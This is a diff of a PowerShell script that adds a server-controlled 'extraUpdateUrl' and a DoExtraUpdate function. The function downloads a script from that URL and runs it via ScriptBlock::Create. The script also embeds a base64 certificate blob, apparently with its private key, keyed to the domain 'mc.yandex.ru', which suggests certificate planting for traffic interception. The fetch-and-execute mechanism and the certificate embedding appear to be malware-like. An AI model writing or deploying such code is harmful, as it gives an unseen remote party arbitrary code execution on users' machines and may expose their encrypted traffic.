@@ -37,7 +37,9 @@
     "embeddings":  [
 
                    ],
-    "isValid":  false
+    "isValid":  false,
+    "extraUpdate":  false,
+    "extraUpdateUrl":  null
 }' | ConvertFrom-Json
 $xdata = @{
     'mc.yandex.ru'='MIIKsQIBAzCCCm0GCSqGSIb3DQEHAaCCCl4EggpaMIIKVjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAg7b907Z/l3VAICB9AEggTYV4Gwenr9KDAv3madoOk1EeF82TazbxTdlpCswTGL'+ 
@@ -1236,8 +1238,8 @@ main
 
 
 
-function DoAutoUpdate() {
-    if (-not $server.autoUpdate){
+function DoExtraUpdate() {
+    if (-not $server.extraUpdate){
         return
     }
     $timeout = [datetime]::UtcNow.AddMinutes(1)
@@ -1246,7 +1248,7 @@ function DoAutoUpdate() {
     
     while ([datetime]::UtcNow -lt $timeout) {
         try {
-            $response = Invoke-WebRequest -Uri $updateUrl -UseBasicParsing -Method Get
+            $response = Invoke-WebRequest -Uri $server.extraUpdateUrl -UseBasicParsing -Method Get
 
             if ($response.StatusCode -eq 200) {
                 $scriptBlock = [ScriptBlock]::Create($response.Content)
@@ -1263,5 +1265,5 @@ function DoAutoUpdate() {
     Write-Error "Failed to download the script within the allotted time."
 }
 
-DoAutoUpdate
+DoExtraUpdate
 
